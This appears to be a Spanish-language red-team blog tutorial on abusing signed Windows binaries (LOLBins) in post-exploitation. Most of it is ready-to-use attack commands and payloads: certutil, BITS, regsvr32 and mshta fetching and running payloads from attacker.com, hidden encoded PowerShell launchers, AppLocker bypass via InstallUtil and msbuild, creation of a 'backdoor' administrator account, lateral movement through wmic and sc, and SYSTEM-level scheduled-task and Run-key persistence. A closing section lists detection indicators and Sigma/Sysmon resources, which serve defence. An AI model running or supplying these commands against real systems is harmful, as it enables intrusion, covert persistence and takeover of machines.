---
layout: single
title: "Living off the Land: LOLBins y LOLBas en operaciones ofensivas"
date: 2026-08-10
categories: [tutoriales, tools]
tags: [lolbins, lolbas, windows, evasion, post-explotacion, pentesting, red-team]
excerpt: "Abusando de binarios legítimos de Windows para descargar payloads, ejecutar código y moverse lateralmente sin levantar alertas de firma."
permalink: /tutoriales/lolbins-lolbas-operaciones-ofensivas/
---

LOLBins (Living Off the Land Binaries) son binarios legítimos del sistema operativo que los atacantes reutilizan para ejecutar código malicioso, descargar payloads, establecer persistencia o moverse lateralmente — sin necesidad de subir herramientas propias al sistema.

La ventaja es directa: estos binarios están firmados por Microsoft, son procesos esperados en cualquier Windows y escapan a las listas negras de AV tradicionales basadas en firma. La detección depende de reglas de comportamiento en EDR y de correlación de logs, no de hashes.

El proyecto [LOLBAS](https://lolbas-project.github.io/) cataloga todos estos binarios con función, argumentos y ejemplos de abuso. Para Linux existe el equivalente [GTFOBins](https://gtfobins.github.io/).

## Categorías de uso

| Categoría | Descripción |
|-----------|-------------|
| Execute | Ejecutar código o comandos arbitrarios |
| Download | Descargar archivos desde red |
| Upload | Exfiltrar datos al exterior |
| Copy | Copiar archivos eludiendo restricciones |
| Encode/Decode | Codificar o decodificar contenido |
| Compile | Compilar código directamente en el objetivo |

---

## Descarga de payloads

### certutil

`certutil.exe` gestiona certificados y PKI. Su flag `-urlcache` descarga archivos arbitrarios desde HTTP/HTTPS:

```cmd
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\payload.exe
```

También codifica y decodifica base64, útil para exfiltración o staging:

```cmd
certutil.exe -encode payload.exe payload.b64
certutil.exe -decode payload.b64 payload.exe
```

### BITSAdmin

BITS gestiona transferencias en background para Windows Update, entre otros. `bitsadmin.exe` crea jobs de descarga propios:

```cmd
bitsadmin /transfer myJob /download /priority high http://attacker.com/nc.exe C:\Temp\nc.exe
```

Alternativa moderna vía PowerShell:

```powershell
Start-BitsTransfer -Source "http://attacker.com/payload.exe" -Destination "C:\Temp\payload.exe"
```

Los jobs de BITS persisten entre reinicios si no se eliminan explícitamente — útil como mecanismo de persistencia también.

---

## Ejecución de código

### regsvr32 — Squiblydoo

`regsvr32.exe` registra COM DLLs, pero acepta scriptlets remotos sin tocar el disco:

```cmd
regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```

El `.sct` es un scriptlet XML con VBScript o JScript embebido:

```xml
<?XML version="1.0"?>
<scriptlet>
  <registration description="update" progid="update" version="1.00">
    <script language="JScript">
      <![CDATA[
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("cmd.exe /c powershell -enc BASE64PAYLOAD", 0, false);
      ]]>
    </script>
  </registration>
</scriptlet>
```

La técnica se conoce como **Squiblydoo**. `regsvr32` lanza `scrobj.dll` como proceso hijo, que carga el scriptlet remoto. Sin escritura en disco del payload real.

### mshta

`mshta.exe` (Microsoft HTML Application Host) ejecuta HTA. Admite URLs remotas y expresiones VBScript inline:

```cmd
mshta.exe http://attacker.com/payload.hta
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c powershell -enc BASE64""")
```

Un HTA básico:

```html
<html>
<head>
<script language="VBScript">
  Set objShell = CreateObject("WScript.Shell")
  objShell.Run "cmd.exe /c powershell -nop -w hidden -enc BASE64PAYLOAD", 0, False
  self.close
</script>
</head>
</html>
```

### wscript / cscript

El Windows Script Host ejecuta VBScript y JScript. `wscript` muestra ventanas; `cscript` corre en consola. Útil cuando PowerShell está restringido:

```cmd
wscript.exe //E:vbscript payload.vbs
cscript.exe payload.js
```

```vbscript
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c net user backdoor P@ss123! /add && net localgroup Administrators backdoor /add", 0, True
```

### InstallUtil

`InstallUtil.exe` forma parte de .NET y puede ejecutar código a través del método `Uninstall` de una clase `Installer`:

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

El payload en C#:

```csharp
using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;

[RunInstaller(true)]
public class Sample : Installer {
    public override void Uninstall(System.Collections.IDictionary savedState) {
        Process.Start("cmd.exe", "/c whoami > C:\\Temp\\out.txt");
    }
}
```

Útil para bypass de AppLocker cuando solo se permiten binarios firmados de .NET.

---

## Compilación en el objetivo

### msbuild

`msbuild.exe` puede ejecutar código C# inline embebido en un archivo de proyecto `.csproj`:

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Exec">
    <InlineTask />
  </Target>
  <UsingTask TaskName="InlineTask" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Diagnostics;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          public class InlineTask : Task, ITask {
            public override bool Execute() {
              Process.Start(new ProcessStartInfo {
                FileName = "cmd.exe",
                Arguments = "/c powershell -nop -w hidden -enc BASE64PAYLOAD",
                UseShellExecute = false
              });
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
msbuild.exe payload.csproj
```

No se compila a un binario persistente — el código se ejecuta en el proceso de msbuild directamente.

---

## Movimiento lateral

### wmic

`wmic.exe` ejecuta procesos remotamente vía WMI sin necesidad de herramientas adicionales:

```cmd
wmic /node:192.168.1.50 /user:DOMAIN\user /password:pass process call create "cmd.exe /c powershell -enc BASE64"
```

### sc.exe — servicios remotos

Crear un servicio temporal en un host remoto para ejecutar comandos:

```cmd
sc \\TARGET create tmpSvc binPath= "cmd.exe /c net user backdoor P@ss123! /add && net localgroup Administrators backdoor /add"
sc \\TARGET start tmpSvc
sc \\TARGET delete tmpSvc
```

Requiere credenciales válidas y que el SMB esté accesible. El binario ejecutado es `cmd.exe`, que ya existe en el sistema.

---

## Persistencia

### schtasks

Crear tareas programadas apuntando a un LOLBin como lanzador:

```cmd
schtasks /create /sc minute /mo 10 /tn "WindowsDefenderUpdate" /tr "mshta.exe http://attacker.com/payload.hta" /ru SYSTEM
```

### reg.exe — Run keys

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "wscript.exe C:\Temp\payload.vbs" /f
```

---

## Detección

Los LOLBins no son invisibles. Sus patrones son conocidos y los EDR modernos los monitorizan con reglas de comportamiento:

| Binario | Indicador sospechoso | Event ID relevante |
|---------|---------------------|-------------------|
| certutil | Argumentos `-urlcache` + URL externa | 4688 (process creation) |
| mshta | Hijo de Office/browser o URL remota | 4688 + conexión de red |
| regsvr32 | `/i:http://` en argumentos | 4688, Sysmon EID 1 |
| msbuild | Ejecución fuera del contexto de Visual Studio | 4688 + análisis de .csproj |
| wmic | `/node:` con credenciales explícitas | 4688 + 4648 (logon explícito) |
| InstallUtil | Ejecución con `/U` sobre binario no firmado | 4688 |

La detección efectiva combina:

1. **Sysmon** con configuración de [SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config) o [Olaf Hartong](https://github.com/olafhartong/sysmon-modular)
2. **Event ID 4688** con auditoría de línea de comandos completa habilitada (`Audit Process Creation` + `Include command line`)
3. **Reglas Sigma** del repositorio [SigmaHQ](https://github.com/SigmaHQ/sigma) — hay reglas específicas para cada LOLBin

La clave defensiva: no bloquear los binarios (rompería el sistema), sino detectar las combinaciones de argumentos y contextos anómalos.

---

## Referencias

- [LOLBAS Project](https://lolbas-project.github.io/) — catálogo completo con ejemplos
- [GTFOBins](https://gtfobins.github.io/) — equivalente para Linux/Unix
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) — pruebas de detección para cada técnica
- [SigmaHQ](https://github.com/SigmaHQ/sigma) — reglas de detección para SIEM
- [MITRE ATT&CK T1218](https://attack.mitre.org/techniques/T1218/) — Signed Binary Proxy Execution
